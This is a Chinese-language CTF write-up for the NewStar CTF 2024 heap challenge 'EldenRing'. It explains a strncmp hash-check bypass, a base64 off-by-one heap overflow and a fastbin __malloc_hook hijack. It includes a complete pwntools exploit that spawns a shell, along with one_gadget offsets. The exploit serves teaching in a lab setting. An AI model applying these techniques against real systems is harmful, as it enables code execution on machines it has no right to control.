# EldenRing

> 分类：Pwn

## 题目描述
菜单堆题。开始需要输入一个字符串，程序将其 sha256 后与预设 hash 比较（strncmp），通过后才能进入主程序。主程序提供三个功能：`Two_Fingers`（add 堆块）、`Three_Fingers`（free 堆块）、`Age_of_the_Stars`（白给 libc 地址）。

## 考察知识点
- sha256 比较绕过（strncmp 遇到 `\x00` 即返回相等）
- Base64 解码长度计算错误导致的堆溢出（off-by-one 改写 size）
- Fastbin Attack / 堆布局（House of Spirit 思想）
- `__malloc_hook` 劫持 + realloc 调整栈环境配合 one_gadget

## 解法

### 1. patchelf
按附件 README.md 所述，先把库文件 patch 到本地：
```bash
sudo patchelf --set-interpreter ./ld-2.23.so ./EldenRing
sudo patchelf --replace-needed libcrypto.so.1.0.0 ./libcrypto.so.1.0.0 ./EldenRing
sudo patchelf --replace-needed libc.so.6 ./libc-2.23.so ./EldenRing
```

### 2. 绕过 hash 检测
预设 hash 第一个字节是 `\x00`，`strncmp` 在两个参数开头都为 `\x00` 时终止比较并返回相等。用脚本随机生成 sha256 后以 `\x00` 开头的可见字符串：

```python
import hashlib
import random
import string

def generate_random_string():
    return ''.join(random.choice(string.printable) for _ in range(random.randint(1, 20)))

def hash256(input_string):
    return hashlib.sha256(input_string.encode()).digest()

def find_valid_input():
    while True:
        random_input = generate_random_string()
        hash_value = hash256(random_input)
        if hash_value[0] == 0:
            print(f"Found input: {random_input}")
            print(f"Hash256: {hash_value.hex()}")
            break

find_valid_input()
```

结果得到 `q8MkK6e0`。注意输入换行符也会影响 hash，所以脚本里用 `p.send("q8MkK6e0")` 规避（或在后面加 `\x00`）。

### 3. 堆漏洞
`base64_decode` 解码时，编码长度 L=⌈N/3⌉×4，安全空间应为 `3×(L/4)+2`，但题目只分配了 `3×(L/4)+1`，从而可以溢出一字节到下一堆块的 size 部分，开始劫持执行流。

### 4. 攻击步骤
1. 布置堆块：`Two_finger(55, b64e(b'sekiro'))` ×3 + `Two_finger(65, ...)`。55 输入下 malloc 的 size 处理向下取整为 `0x28`，但实际可写 `55//4*3+2 = 0x29` 字节。
2. free chunk0 再 malloc 回来，写 0x29 字节使 chunk1 的 size 位变为 `0x61`，覆盖 chunk2。
3. free chunk1 再 malloc（109 左右），把 chunk2 的 size `0x31` 改写为 `0x71`，覆盖 chunk3。
4. free 掉 `0x61` 和 `0x71` 的 chunk（chunk2、chunk1）。
5. 通过 `Age_of_the_Stars()` 泄露 libc 地址。
6. 取回 fastbin[0x60]，改写 `0x71` chunk 的 next 位为 `libc_base + __malloc_hook - 0x23`。
7. 连续分配两个满足 fastbin[0x70] 的 chunk，在 `__malloc_hook` 中填入 one_gadget。
8. one_gadget 直接使用不满足约束，使用 trick：在 `__malloc_hook` 填 `realloc+6`，`__realloc_hook` 填 one_gadget（偏移 `0xf1247`）。

### 完整 EXP

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process('./EldenRing')
elf=ELF("./EldenRing")
libc=elf.libc
def debug():
    gdb.attach(p)
    pause()
def cmd(cho):
    p.recvuntil(b'choice')
    p.sendline(str(cho))
def Two_finger(size,cnt):
    cmd(2)
    p.sendlineafter(b's do you want to create for restoration?',str(size))
    p.sendlineafter(b'understand...',cnt)
def Three_finger(idx):
    cmd(3)
    p.sendlineafter(b'Which Rune do you want to destroy?',str(idx))
def Age_of_the_Stars():
    cmd(4)
def Dung_Eater():
    cmd(18)
# chunk 0x31---> rune size 55
p.sendafter(b'ber who you are?', b"q8MkK6e0\x00nosekiro")
Two_finger(55,b64e(b'sekiro')) # 0
Two_finger(55,b64e(b'sekiro')) # 1
Two_finger(55,b64e(b'sekiro')) # 2
Two_finger(65,b64e(b'sekiro')) # 3

Three_finger(0)
Two_finger(55,b64e(p64(0)*5+p8(0x61))) # 0

Three_finger(1)
Two_finger(109,b64e(p64(0)*5+p8(0x71))) # 1

Three_finger(2)
Three_finger(1)

# ---------------------- leak libcaddr
Age_of_the_Stars()
p.recvuntil(b'0x')
libc_base = int(p.recv(12), 16) - libc.symbols['printf']
hijackaddr = libc_base + libc.symbols['__malloc_hook'] - 0x23
print(hex(libc_base))

# ---------------------- Attack __malloc_hook
Two_finger(97,b64e(p64(0)*5+p64(0x71)+p64(hijackaddr))) # 1 To modify

Two_finger(123,b64e(b'sekiro')) # 2
Two_finger(123,b64e(b'\x00'*(0x13-8)+p64(libc_base+0xf1247)+p64(libc_base+libc.symbols['realloc']+6)))#attack chunk

# ---------------------- Trigger
Two_finger(18,b64e(b"End?Never"))

p.interactive()

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/pwn/eldenring.html
